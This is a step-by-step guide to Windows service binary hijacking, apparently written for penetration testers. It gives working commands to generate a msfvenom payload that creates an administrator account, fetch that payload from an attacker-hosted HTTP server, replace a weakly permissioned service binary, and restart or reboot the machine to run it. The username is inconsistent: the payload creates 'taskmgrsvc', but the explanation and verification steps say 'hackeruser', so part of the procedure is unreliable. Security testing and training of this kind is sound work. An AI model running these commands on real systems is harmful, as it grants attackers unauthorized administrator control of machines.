## Service Binary Hijacking

### Overview
Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state. 

A misconfiguration, where a service binary has **Full Control (F)** permissions for low-privileged users (e.g., BUILTIN\Users), allows attackers to replace the binary with a malicious executable. When the service restarts or the system reboots, the malicious binary will execute with the privileges of the service (e.g., LocalSystem).

---

### Step 1: Identify a Vulnerable File
Start by running **WinRecon.ps1** to locate services with weak permissions:

1. **Option 2**: Run Custom Recon - (Select which functions to enable)
2. **Option 17**: Enumerate files and services for **weak permissions**.

This will provide a list of binaries or services that have insecure permissions, such as Full Control for low-privileged users (e.g., BUILTIN\Users).

Example Output:
```plaintext
[+] Service: <service>
    Binary Path:<service_path>
    BUILTIN\Users:(F)
```
```plaintext
[+] Service: BackupService
    Binary Path:C:\backups\backupsvc.exe
    BUILTIN\Users:(F)
```

In this example, the binary `C:\backups\backupsvc.exe` has **BUILTIN\Users:(F)** permissions, making it a candidate for exploitation.

---

### Exploitation Stage

#### Step 2: Generate a Malicious Executable
On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:

```bash
msfvenom -p windows/exec CMD="net user taskmgrsvc Password123! /add; net localgroup administrators taskmgrsvc /add" -f exe-service -o adduser.exe
```

- **Payload**: `windows/exec` runs arbitrary commands.
- **Commands**: 
   - `net user taskmgrsvc Password123! /add`: Creates a new user `taskmgrsvc`.
   - `net localgroup administrators hackeruser /add`: Adds `hackeruser` to the Administrators group.
- **Output**: The malicious binary is saved as `adduser.exe`.

---

#### Step 3: Transfer the Malicious Binary to the Target Machine
Start a Python HTTP server to host the malicious binary:

```bash
python3 -m http.server 80
```

On the target machine, download the malicious executable using PowerShell:

```powershell
iwr -uri http://<attacker_ip>/adduser.exe -OutFile adduser.exe
```

---

#### Step 4: Replace the Service Binary
1. Backup the original binary:
   ```powershell
   move <service_path> <file_name>.bak
   ```
2. Replace it with the malicious binary:
   ```powershell
   move .\adduser.exe <service_path>
   ```

Example:
```powershell
move C:\backups\backupsvc.exe backupsvc.exe.bak
move .\adduser.exe C:\backups\backupsvc.exe
```

---

#### Step 5: Restart the Service
1. **Stop the Service**:
   ```powershell
   sc.exe stop <service_name>
   ```
2. **Start the Service**:
   ```powershell
   sc.exe start <service_name>
   ```

Example:
```powershell
sc.exe stop BackupService
sc.exe start BackupService
```

If the service cannot be restarted manually due to insufficient permissions:

1. **Check Service Startup Type**:
   ```powershell
   Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}
   ```
   Example:
   ```powershell
   Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'BackupService'}
   ```
   Output:
   ```plaintext
   Name           StartMode
   ----           ---------
   BackupService  Auto
   ```

2. **Reboot the System**:
   Verify that the current user has the `SeShutdownPrivilege`:
   ```powershell
   whoami /priv
   ```
   Example Output:
   ```plaintext
   SeShutdownPrivilege           Shut down the system                 Enabled
   ```

   Reboot the machine:
   ```powershell
   shutdown /r /t 0
   ```

---

#### Step 6: Verify Exploitation
After the reboot or service restart, reconnect to the target machine and check if the user `hackeruser` has been added to the Administrators group:

```powershell
Get-LocalGroupMember administrators
```

**Output**:
```plaintext
ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        <system_name>\Administrator Local
User        <system_name>\hackeruser    Local
```

Example:
```plaintext
User        TARGETSYSTEM\Administrator Local
User        TARGETSYSTEM\hackeruser    Local
```

The output confirms the addition of `hackeruser` to the local Administrators group.

---

### Cleanup
To restore the original state of the service:
1. Delete the malicious binary:
   ```powershell
   del <service_path>
   ```
2. Restore the original binary:
   ```powershell
   move <file_name>.bak <service_path>
   ```
3. Restart the service:
   ```powershell
   sc.exe stop <service_name>
   sc.exe start <service_name>
   ```

Example:
```powershell
del C:\backups\backupsvc.exe
move backupsvc.exe.bak C:\backups\backupsvc.exe
sc.exe stop BackupService
sc.exe start BackupService
```

---

### Notes:
- This method relies on services running with high privileges (e.g., LocalSystem).
- Always back up the original binary to prevent accidental service disruption.
- Avoid rebooting production systems during penetration tests without authorization.

---

### References
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- Microsoft Documentation on `icacls` and `sc.exe`

---

**End of Service Binary Hijacking Exploit Guide**
